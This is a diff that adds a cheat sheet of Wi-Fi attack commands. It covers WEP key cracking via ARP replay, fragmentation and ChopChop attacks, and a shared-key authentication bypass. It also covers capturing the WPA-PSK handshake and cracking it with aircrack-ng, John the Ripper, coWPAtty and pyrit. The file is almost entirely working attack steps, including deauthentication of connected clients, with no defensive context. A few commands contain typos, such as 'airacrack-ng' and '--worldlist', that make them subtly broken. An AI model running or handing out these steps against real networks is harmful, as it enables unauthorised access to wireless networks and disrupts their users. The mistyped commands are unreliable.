@@ -1,0 +1,75 @@
+# cracking WEP with clients
+airmon-ng start wlan0 $AP_CHANNEL
+airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $FILENAME mon0
+aireplay-ng -1 0 -e $AP_ESSID -a $AP_MAC -h $SELF_MAC mon0    # Fake-auth
+aireplay-ng -3 -b $AP_MAC -h $SELF_MAC mon0    # ARP Replay attack
+aireplay-ng -0 1 -a $AP_MAC -c $CLIENT_MAC mon0    # Deauthentication to get an ARP packet faster
+aircrack-ng -0 $CAP_FILE
+
+
+# cracking WEP via a client
+airmon-ng start wlan0 $AP_CHANNEL
+airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $FILENAME mon0
+aireplay-ng -1 0 -e $AP_ESSID -a $AP_MAC -h $SELF_MAC mon0    # Fake auth
+aireplay-ng -2 -b $AP_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0    # Interactive packet reply attack
+aircrack-ng -0 -z -n 64 $CAP_FILE
+
+
+# clientless WEP cracking
+airmon-ng start wlan0 $AP_CHANNEL
+airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $FILENAME mon0
+aireplay-ng -1 0 -e $AP_ESSID -a $AP_MAC -h $SELF_MAC mon0    # Fake-auth
+aireplay-ng -5 -b $AP_MAC -h $SELF_MAC mon0    # Fragmentation attack for PRGA
+aireplay-ng -4 -b $AP_MAC -h $SELF_MAC mon0    # If Frag attack fails, use Korek ChopChop attack for PRGA
+packetforge-ng -0 -a $AP_MAC -h $SELF_MAC -l $SOURCE_IP -k $DESTINATION_IP -y $XOR_FILENAME -w $PACKET_FILENAME    # After got PRGA
+aireplay-ng -2 -r $PACKET_FILENAME mon0    # Interactive packet reply after crafted the packet
+aircrack-ng -0 $CAP_FILE
+
+
+# bypassing WEP SKA
+airmon-ng start wlan0 $AP_CHANNEL
+airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $FILENAME mon0
+aireplay-ng -0 1 -a $AP_MAC -c $CLIENT_MAC mon0    # Deauthentication attack for PRGA xor file
+aireplay-ng -1 60 -e $AP_ESSID -y $PRGA_FILENAME -a $AP_MAC -h $SELF_MAC mon0    # Shared key fake auth attack
+aireplay-ng -3 -b $AP_MAC -h $SELF_MAC mon0    # ARP Replay attack
+aireplay-ng -0 1 -a $AP_MAC -c $CLIENT_MAC mon0    # Deauthentication to get an ARP packet faster
+aircrack-ng -0 -z -n 64 $CAP_FILE
+
+
+# cracking WPA PSK
+airmon-ng start wlan0 $AP_CHANNEL
+airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $FILENAME mon0
+aireplay-ng -0 1 -a $AP_MAC -c $CLIENT_MAC mon0    # Deauthentication to get a 4 way handshake
+airacrack-ng -0 -w $WORDLIST $CAPTURE_FILE
+
+
+# cracking WPA with John The Ripper
+airmon-ng start wlan0 $AP_CHANNEL
+airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $FILENAME mon0
+aireplay-ng -0 1 -a $AP_MAC -c $CLIENT_MAC mon0    # Deauthentication to get a 4 way handshake
+# change to password folder
+vim john.conf    # Edit "List.Rules:Wordlist" --> add regex for more words eg. "$[0-9]$[0-9]"
+./john --worldlist=$WORDLIST --rules --stdout | aircrack-ng -0 -e $AP_ESSID -w $CAPTURE_FILE
+
+
+# cracking WPA with coWPAtty
+airmon-ng start wlan0 $AP_CHANNEL
+airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $FILENAME mon0
+aireplay-ng -0 1 -a $AP_MAC -c $CLIENT_MAC mon0    # Deauthentication to get a 4 way handshake
+cowpatty -r $CAPTURE_FILE -f $WORDLIST -2 s $AP_ESSID
+genpmk -f $WORDLIST -d HASH_FILENAME -s $AP_ESSID    # Gen WPA hashes for rainbow attack
+cowpatty -r $CAPTURE_FILE -d HASH_FILENAME -2 -s $AP_ESSID    # Start the rainbow attack 
+
+
+# cracking WPA with pyrit
+airmon-ng start wlan0 $AP_CHANNEL
+airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $FILENAME mon0
+aireplay-ng -0 1 -a $AP_MAC -c $CLIENT_MAC mon0    # Deauthentication to get a 4 way handshake
+pyrit list_cores
+pyrit -r $CAPTURE_FILE -i $WORDLIST -b $AP_MAC attack_passthrough
+
+pyrit -i $WORDLIST import_password    # Import the wordlist to the database
+pyrit -e $AP_ESSID create_essid    # Add ESSID to the database 
+pyrit batch
+pyrit -r $CAPTURE_FILE attack_db
+
